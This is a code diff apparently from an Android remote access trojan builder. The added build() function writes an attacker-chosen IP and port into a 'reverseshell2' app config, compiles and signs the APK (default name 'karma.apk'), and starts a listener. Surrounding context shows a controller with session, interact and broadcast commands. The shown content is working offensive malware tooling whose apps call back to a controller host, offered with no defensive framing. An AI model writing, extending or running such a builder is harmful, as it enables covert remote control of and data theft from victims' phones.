@@ -426,3 +426,52 @@ def get_shell(ip, port):
             os._exit(0)
         else:
             print("\033[1m\033[33mUnknown command. Use 'sessions', 'interact <id>', 'broadcast <cmd>', 'exit'.\033[0m")
+
+def build(ip,port,output,isNgrok,localport,icon):
+    if isNgrok:
+        print(stdOutput("info")+"\033[1mUsing Ngrok configuration")
+        with open("Android_Code/app/src/main/java/com/example/reverseshell2/config.java", "r") as f:
+            conf = f.read()
+        conf = conf.replace("192.168.0.105", ip)
+        conf = conf.replace("8888", port)
+        conf = conf.replace("true", str(icon).lower()) if icon is not None else conf
+
+    else:
+        print(stdOutput("info")+"\033[1mStarting building process")
+        with open("Android_Code/app/src/main/java/com/example/reverseshell2/config.java", "r") as f:
+            conf = f.read()
+        conf = conf.replace("192.168.0.105", ip)
+        conf = conf.replace("8888", port)
+        conf = conf.replace("true", str(icon).lower()) if icon is not None else conf
+
+    with open("Android_Code/app/src/main/java/com/example/reverseshell2/config.java", "w") as f:
+        f.write(conf)
+
+    if localport:
+        port = localport
+
+    print(stdOutput("info")+f"\033[1mSetting up Configuration\n|_ IP: {ip}\n|_ Port: {port}")
+
+    # Run gradlew to build APK
+    import subprocess
+    try:
+        print(stdOutput("info")+"\033[1mBuilding APK")
+        subprocess.call("cd Android_Code && chmod +x gradlew", shell=True)
+        subprocess.call("cd Android_Code && ./gradlew assembleDebug", shell=True)
+
+        # Copy and sign APK
+        output = "karma.apk" if not output else output
+        subprocess.call(f"cp Android_Code/app/build/outputs/apk/debug/app-debug.apk {output}", shell=True)
+        print(stdOutput("success")+f"\033[1mSuccessfully Created APK: {output}")
+        
+        print(stdOutput("info")+"\033[1mSigning APK")
+        subprocess.call(f"java -jar Jar_utils/sign.jar {output}", shell=True)
+        print(stdOutput("success")+"\033[1mSuccessfully Signed APK")
+        
+        if isNgrok:
+            print(stdOutput("info")+"\033[1mStarting Server")
+            get_shell("0.0.0.0",localport) 
+
+    except Exception as e:
+        print(stdOutput("error")+"\033[1mError while building APK: " + str(e))
+        sys.exit(1)
